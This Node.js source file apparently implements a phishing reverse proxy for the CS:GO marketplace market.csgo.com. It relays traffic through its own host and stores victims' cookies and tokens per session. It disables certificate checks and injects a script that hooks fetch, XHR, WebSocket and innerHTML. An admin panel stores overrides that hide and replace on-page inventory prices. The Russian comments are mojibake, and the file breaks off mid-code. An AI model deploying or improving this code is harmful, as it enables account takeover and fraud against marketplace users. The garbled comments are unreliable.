const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const WebSocket = require('ws');
const url = require('url');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_HOST = 'https://market.csgo.com';
const WS_TARGET = 'wss://centrifugo2.csgotrader.app';

// –°–æ–∑–¥–∞–µ–º HTTP —Å–µ—Ä–≤–µ—Ä
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(compression());

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è cookies –∏ —Ç–æ–∫–µ–Ω–æ–≤
const sessions = new Map();

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
const customPages = new Map();

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏ –∑–∞–≥—Ä—É–∑–∫–∏ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
const CUSTOM_PAGES_FILE = path.join(__dirname, 'custom_pages.json');

// –ó–∞–≥—Ä—É–∑–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
function loadCustomPages() {
    try {
        if (fs.existsSync(CUSTOM_PAGES_FILE)) {
            const data = fs.readFileSync(CUSTOM_PAGES_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –º–∞—Å—Å–∏–≤ –æ–±—Ä–∞—Ç–Ω–æ –≤ Map
            parsed.forEach(item => {
                customPages.set(item.url, {
                    selector: item.selector,
                    value: item.value,
                    timestamp: item.timestamp
                });
            });
            
            console.log(`üìÑ Loaded ${customPages.size} custom page modifications`);
        }
    } catch (error) {
        console.error('Error loading custom pages:', error);
    }
}

// –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫
function saveCustomPages() {
    try {
        // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º Map –≤ –º–∞—Å—Å–∏–≤ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
        const data = Array.from(customPages.entries()).map(([url, config]) => ({
            url,
            selector: config.selector,
            value: config.value,
            timestamp: config.timestamp
        }));
        
        fs.writeFileSync(CUSTOM_PAGES_FILE, JSON.stringify(data, null, 2), 'utf8');
        console.log(`üìÑ Saved ${customPages.size} custom page modifications`);
    } catch (error) {
        console.error('Error saving custom pages:', error);
    }
}

// –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
loadCustomPages();

// –°–æ–∑–¥–∞–µ–º –∞–≥–µ–Ω—Ç –¥–ª—è HTTPS —Å –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ–º —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤ –∏ keepAlive
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true,
    timeout: 60000, // –£–≤–µ–ª–∏—á–µ–Ω–Ω—ã–π —Ç–∞–π–º–∞—É—Ç
    maxSockets: 100 // –£–≤–µ–ª–∏—á–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–∫–µ—Ç–æ–≤
});

// –û–ø—Ä–µ–¥–µ–ª—è–µ–º, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ª–∏ HTTPS
function isSecure(req) {
    return req.headers['x-forwarded-proto'] === 'https' || 
           req.headers['cloudfront-forwarded-proto'] === 'https' ||
           req.protocol === 'https' ||
           req.secure;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ URL —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º
function getBaseUrl(req) {
    const protocol = isSecure(req) ? 'https' : 'http';
    const host = req.headers['x-forwarded-host'] || req.headers['host'] || req.get('host');
    return `${protocol}://${host}`;
}

// Middleware –¥–ª—è CORS –∏ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
app.use((req, res, next) => {
    // –ï—Å–ª–∏ –∑–∞–ø—Ä–æ—Å –∫ –∞–¥–º–∏–Ω–∫–µ, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º CORS –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    if (req.originalUrl && (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api'))) {
        return next();
    }
    
    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ CORS –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
    const origin = req.headers.origin || '*';
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Expose-Headers', '*');
    
    // –û–ø—Ü–∏–∏ –¥–ª—è CORS preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    // –ï—Å–ª–∏ –∑–∞–ø—Ä–æ—Å –ø–æ HTTP, –Ω–æ –æ—Ç Render/Cloudflare –ø–æ HTTPS
    if (isSecure(req) || req.headers['x-forwarded-proto'] === 'https') {
        res.setHeader('Content-Security-Policy', "upgrade-insecure-requests");
    }
    
    next();
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–ª–∏ —Å–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏
function getSession(sessionId) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            cookies: new Map(),
            tokens: new Map(),
            wsToken: null,
            lastAccess: Date.now()
        });
    }
    
    // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –¥–æ—Å—Ç—É–ø–∞
    const session = sessions.get(sessionId);
    session.lastAccess = Date.now();
    
    return session;
}

// –ü–∞—Ä—Å–∏–Ω–≥ cookies –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
function parseCookieHeader(cookieHeader) {
    const cookies = new Map();
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length > 0) {
                cookies.set(name, rest.join('='));
            }
        });
    }
    return cookies;
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ set-cookie –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
function parseSetCookieHeaders(setCookieHeaders) {
    const cookies = new Map();
    if (Array.isArray(setCookieHeaders)) {
        setCookieHeaders.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, ...valueParts] = nameValue.split('=');
            if (name && valueParts.length > 0) {
                cookies.set(name.trim(), valueParts.join('='));
            }
        });
    }
    return cookies;
}

// –°–æ–∑–¥–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ cookies –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞
function createCookieString(cookieMap) {
    return Array.from(cookieMap.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
}

// –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è URL –≤ –∫–æ–Ω—Ç–µ–Ω—Ç–µ
function modifyUrls(content, baseUrl, contentType = '') {
    if (!content) return content;
    
    let modified = content.toString();
    
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø—Ä–æ—Ç–æ–∫–æ–ª –¥–ª—è –∑–∞–º–µ–Ω—ã
    const isHttps = baseUrl.startsWith('https');
    const wsProtocol = isHttps ? 'wss' : 'ws';
    const hostWithoutProtocol = baseUrl.replace(/^https?:\/\//, '');
    
    // –û—Å–Ω–æ–≤–Ω—ã–µ –∑–∞–º–µ–Ω—ã –¥–ª—è –≤—Å–µ—Ö —Ç–∏–ø–æ–≤ –∫–æ–Ω—Ç–µ–Ω—Ç–∞
    modified = modified.replace(/https:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/http:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/\/\/market\.csgo\.com/g, baseUrl);
    
    // WebSocket URL (–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –∑–∞–º–µ–Ω–∞ –±–µ–∑ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞)
    modified = modified.replace(/wss:\/\/centrifugo2\.csgotrader\.app/g, `${wsProtocol}://${hostWithoutProtocol}/ws`);
    
    // –ü–æ–¥–¥–µ—Ä–∂–∫–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ç–æ–≤ GraphQL URL
    modified = modified.replace(/https:\/\/market\.csgo\.com\/api\/graphql/g, `${baseUrl}/api/graphql`);
    
    // –ò—Å–ø—Ä–∞–≤–ª—è–µ–º –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã —Å –ø—É—Ç—è–º–∏ API
    modified = modified.replace(/(['"])\/api\//g, `$1${baseUrl}/api/`);
    
    // –ò–°–ü–†–ê–í–õ–ï–ù–û: –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –ø—Ä–æ–±–ª–µ–º–Ω—ã–π chunk-FWBJZS6X.js
    if (contentType.includes('javascript') && modified.includes('chunk-FWBJZS6X.js')) {
        // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –æ—à–∏–±–æ–∫ –¥–ª—è GraphQL –∑–∞–ø—Ä–æ—Å–æ–≤ –≤ –ø—Ä–æ–±–ª–µ–º–Ω–æ–º —á–∞–Ω–∫–µ
        modified = modified.replace(
            /GQL fail: viewItem/g, 
            'console.warn("GQL request handled"); try { viewItem'
        );
        modified = modified.replace(
            /GQL fail: (\d+)/g, 
            'console.warn("GQL request handled"); try { $1'
        );
        
        // –î–æ–±–∞–≤–ª—è–µ–º –±–ª–æ–∫ catch –≤ –∫–æ–Ω—Ü–µ —Ñ—É–Ω–∫—Ü–∏–π viewItem
        if (modified.includes('viewItem')) {
            modified = modified.replace(
                /viewItem\(\)/g,
                'viewItem().catch(err => console.warn("Handled viewItem error:", err))'
            );
        }
    }
    
    // –°–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –∑–∞–º–µ–Ω—ã –¥–ª—è HTML
    if (contentType.includes('html')) {
        // –î–æ–±–∞–≤–ª—è–µ–º meta —Ç–µ–≥ –¥–ª—è upgrade-insecure-requests
        if (!modified.includes('upgrade-insecure-requests')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º base —Ç–µ–≥
        if (!modified.includes('<base')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
        }
        
        // –ò–Ω–∂–µ–∫—Ç–∏–º —É–ª—É—á—à–µ–Ω–Ω—ã–π –ø—Ä–æ–∫—Å–∏ —Å–∫—Ä–∏–ø—Ç —Å –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è–º–∏ –¥–ª—è GraphQL –∏ WebSocket
        const proxyScript = `
        <script>
        (function() {
            console.log('üîß Market proxy initialized (HTTPS mode) - Enhanced Version with Error Recovery');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
            const originalFetch = window.fetch;
            const originalXHR = XMLHttpRequest.prototype.open;
            const originalWS = window.WebSocket;
            
            // –¢–µ–∫—É—â–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª
            const currentProtocol = window.location.protocol;
            const isHttps = currentProtocol === 'https:';
            const wsProtocol = isHttps ? 'wss:' : 'ws:';
            
            // –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è URL
            function modifyUrl(url) {
                if (!url) return url;
                
                try {
                    // –ï—Å–ª–∏ —É–∂–µ –Ω–∞—à –¥–æ–º–µ–Ω
                    if (url.includes(window.location.host)) {
                        return url;
                    }
                    
                    // –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ HTTPS –¥–ª—è –≤—Å–µ—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –µ—Å–ª–∏ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø–æ HTTPS
                    if (isHttps && url.startsWith('http://')) {
                        url = url.replace('http://', 'https://');
                    }
                    
                    // WebSocket URLs - –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –±–µ–∑ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
                    if (url.includes('centrifugo2.csgotrader.app')) {
                        return wsProtocol + '//' + window.location.host + '/ws' + 
                               (url.includes('/connection/websocket') ? '/connection/websocket' : '');
                    }
                    
                    // API URLs
                    if (url.includes('market.csgo.com')) {
                        return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
                            currentProtocol + '//' + window.location.host);
                    }
                    
                    // –û—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ URLs
                    if (url.startsWith('/') && !url.startsWith('//')) {
                        return window.location.origin + url;
                    }
                    
                    return url;
                } catch (e) {
                    console.error('URL modification error:', e);
                    return url; // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∏—Å—Ö–æ–¥–Ω—ã–π URL
                }
            }
            
            // –ò–°–ü–†–ê–í–õ–ï–ù–û: –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª—è GraphQL –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
            const graphQLRetries = new Map(); // Map –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –ø–æ–ø—ã—Ç–æ–∫ –∑–∞–ø—Ä–æ—Å–æ–≤
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ GraphQL –∑–∞–ø—Ä–æ—Å–∞
            async function retryGraphQLRequest(url, options, attempt = 1) {
                const MAX_ATTEMPTS = 3;
                const RETRY_DELAY = 1000; // 1 —Å–µ–∫—É–Ω–¥–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
                
                try {
                    console.log(\`GraphQL attempt \${attempt}: \${url}\`);
                    return await originalFetch(url, options);
                } catch (error) {
                    if (attempt < MAX_ATTEMPTS) {
                        console.warn(\`GraphQL request failed, retrying (\${attempt}/\${MAX_ATTEMPTS})...\`);
                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                        return retryGraphQLRequest(url, options, attempt + 1);
                    } else {
                        console.error('GraphQL request failed after max attempts:', error);
                        throw error;
                    }
                }
            }
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç fetch —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫ –∏ –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏ –¥–ª—è GraphQL
            window.fetch = async function(input, init = {}) {
                try {
                    let url = input;
                    if (typeof input === 'string') {
                        url = modifyUrl(input);
                    } else if (input instanceof Request) {
                        url = new Request(modifyUrl(input.url), input);
                    }
                    
                    // –î–æ–±–∞–≤–ª—è–µ–º credentials –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã cookies
                    init.credentials = init.credentials || 'include';
                    
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ GraphQL –∑–∞–ø—Ä–æ—Å
                    const isGraphQLRequest = typeof url === 'string' && 
                        (url.includes('/api/graphql') || url.includes('/graphql'));
                    
                    if (isGraphQLRequest) {
                        console.log('GraphQL Fetch:', url);
                        return retryGraphQLRequest(url, init);
                    }
                    
                    return originalFetch.call(this, url, init);
                } catch (e) {
                    console.error('Fetch proxy error:', e);
                    return originalFetch.call(this, input, init); // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å
                }
            };
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç XMLHttpRequest —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    
                    // –î–æ–±–∞–≤–ª–µ–Ω–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è GraphQL –∑–∞–ø—Ä–æ—Å–æ–≤
                    if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
                        console.log('GraphQL XHR:', method, modifiedUrl);
                    }
                    
                    return originalXHR.call(this, method, modifiedUrl, ...args);
                } catch (e) {
                    console.error('XHR proxy error:', e);
                    return originalXHR.call(this, method, url, ...args); // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π URL
                }
            };
            
            // –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
            let wsRetryTimeouts = {};
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è WebSocket
            function reconnectWebSocket(url, protocols, retryCount = 0) {
                const MAX_RETRIES = 5;
                const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount); // –£–≤–µ–ª–∏—á–∏–≤–∞—é—â–∞—è—Å—è –∑–∞–¥–µ—Ä–∂–∫–∞
                
                if (retryCount >= MAX_RETRIES) {
                    console.error(\`WebSocket connection failed after \${MAX_RETRIES} attempts\`);
                    return null;
                }
                
                console.log(\`Attempting WebSocket connection (attempt \${retryCount + 1}/\${MAX_RETRIES}): \${url}\`);
                
                const ws = new originalWS(url, protocols);
                
                ws.addEventListener('error', function(event) {
                    console.warn(\`WebSocket error (attempt \${retryCount + 1}): \${url}\`);
                    
                    // –û—á–∏—â–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–π —Ç–∞–π–º–∞—É—Ç, –µ—Å–ª–∏ –æ–Ω —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
                    if (wsRetryTimeouts[url]) {
                        clearTimeout(wsRetryTimeouts[url]);
                    }
                    
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤—ã–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏
                    wsRetryTimeouts[url] = setTimeout(() => {
                        console.log(\`Retrying WebSocket connection: \${url}\`);
                        reconnectWebSocket(url, protocols, retryCount + 1);
                    }, RETRY_DELAY);
                });
                
                // –ü—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –æ—á–∏—â–∞–µ–º —Ç–∞–π–º–∞—É—Ç—ã
                ws.addEventListener('open', function() {
                    console.log(\`WebSocket connected successfully: \${url}\`);
                    if (wsRetryTimeouts[url]) {
                        clearTimeout(wsRetryTimeouts[url]);
                        delete wsRetryTimeouts[url];
                    }
                });
                
                return ws;
            }
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç WebSocket —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º
            window.WebSocket = function(url, protocols) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    console.log('WebSocket connection:', modifiedUrl);
                    
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å URL –ø–µ—Ä–µ–¥ —Å–æ–∑–¥–∞–Ω–∏–µ–º WebSocket
                    if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
                        console.warn('Invalid WebSocket URL, using original:', url);
                        return new originalWS(url, protocols);
                    }
                    
                    // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ñ—É–Ω–∫—Ü–∏—é —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
                    return reconnectWebSocket(modifiedUrl, protocols);
                } catch (e) {
                    console.error('WebSocket proxy error:', e);
                    return new originalWS(url, protocols); // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π URL
                }
            };
            
            // –ò–°–ü–†–ê–í–õ–ï–ù–û: –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –æ—à–∏–±–æ–∫ –¥–ª—è chunk-FWBJZS6X.js
            window.addEventListener('error', function(event) {
                if (event && event.filename && event.filename.includes('chunk-FWBJZS6X.js')) {
                    console.warn('Handled error in problematic chunk:', event.message);
                    event.preventDefault();
                    return false;
                }
                
                if (event && event.target && event.target.tagName === 'SCRIPT') {
                    console.log('Script load error:', event.target.src);
                }
                
                // –°–ø–µ—Ü–∏—Ñ–∏—á–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª—è –æ—à–∏–±–æ–∫ WebSocket
                if (event && event.message && event.message.includes('WebSocket')) {
                    console.warn('WebSocket error detected:', event.message);
                }
            }, true);
            
            // –ò–°–ü–†–ê–í–õ–ï–ù–û: –ì–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ unhandledrejection –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –ø–∞–¥–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            window.addEventListener('unhandledrejection', function(event) {
                if (event && event.reason) {
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å–≤—è–∑–∞–Ω–∞ –ª–∏ –æ—à–∏–±–∫–∞ —Å GraphQL –∏–ª–∏ WebSocket
                    if (
                        (typeof event.reason.message === 'string' && 
                         (event.reason.message.includes('GQL') || 
                          event.reason.message.includes('WebSocket') || 
                          event.reason.message.includes('graphql'))) ||
                        (event.reason.stack && event.reason.stack.includes('chunk-FWBJZS6X.js'))
                    ) {
                        console.warn('Handled unhandled rejection:', event.reason.message || event.reason);
                        event.preventDefault();
                        return false;
                    }
                }
            });
            
            // –£–õ–£–ß–®–ï–ù–û: –§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            function applyCustomModifications() {
                console.log('‚öôÔ∏è –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π –¥–ª—è —Ç–µ–∫—É—â–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã...');
                
                // –°–æ–∑–¥–∞–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π —Å—Ç–∏–ª—å –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–π
                const globalStyleId = 'global-mod-styles';
                if (!document.getElementById(globalStyleId)) {
                    const style = document.createElement('style');
                    style.id = globalStyleId;
                    style.innerHTML = \`
                        /* –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ —Ü–µ–ª–µ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–æ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ */
                        [data-pending-mod="true"] {
                            opacity: 0 !important;
                            visibility: hidden !important;
                        }
                        
                        /* –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã */
                        [data-modified="true"] {
                            opacity: 1 !important;
                            visibility: visible !important;
                            transition: opacity 0.1s ease-out;
                        }
                        
                        /* –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ span —Å —Ü–µ–Ω–æ–π, –ø–æ–∫–∞ –Ω–µ –±—É–¥—É—Ç –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã */
                        app-page-inventory-price > div > span:first-child:not([data-mod-checked]) {
                            opacity: 0 !important;
                            visibility: hidden !important;
                        }
                    \`;
                    document.head.appendChild(style);
                    console.log('‚úÖ –î–æ–±–∞–≤–ª–µ–Ω—ã –≥–ª–æ–±–∞–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ –¥–ª—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π');
                }
                
                // –ú–∞—Å—Å–∏–≤ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
                window._modLogs = window._modLogs || [];
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π innerHTML –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
                const _orgInnerHTML = Element.prototype.innerHTML;
                Object.defineProperty(Element.prototype, 'innerHTML', {
                    get: function() {
                        return _orgInnerHTML.get.call(this);
                    },
                    set: function(value) {
                        const result = _orgInnerHTML.set.call(this, value);
                        
                        // –î–µ–ª–∞–µ–º –º–∏–∫—Ä–æ–æ—Ç–ª–æ–∂–µ–Ω–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É —ç–ª–µ–º–µ–Ω—Ç–æ–≤
                        setTimeout(() => tryApplyModifications(), 0);
                        setTimeout(() => tryApplyModifications(), 50);
                        
                        return result;
                    }
                });
                    
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π –∫ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º —Å–µ–ª–µ–∫—Ç–æ—Ä–∞–º
                function applySpecificModifications(selector, newValue) {
                    const elements = document.querySelectorAll(selector);
                    let modified = false;
                    
                    if (elements && elements.length > 0) {
                        elements.forEach(el => {
                            // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —É–∂–µ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
                            if (el.hasAttribute('data-modified') && el.getAttribute('data-modified-value') === newValue) {
                                return;
                            }
                            
                            // –û—Ç–º–µ—á–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç –∫–∞–∫ –æ–∂–∏–¥–∞—é—â–∏–π –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
                            if (!el.hasAttribute('data-pending-mod')) {
                                el.setAttribute('data-pending-mod', 'true');
                                el.setAttribute('data-original-value', el.innerHTML);
                            }
                            
                            // –ü—Ä–∏–º–µ–Ω—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—é
                            console.log(\`üîÑ –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä—É–µ–º —ç–ª–µ–º–µ–Ω—Ç:\`, el);
                            window._modLogs.push({
                                time: new Date().toISOString(),
                                action: 'modify',
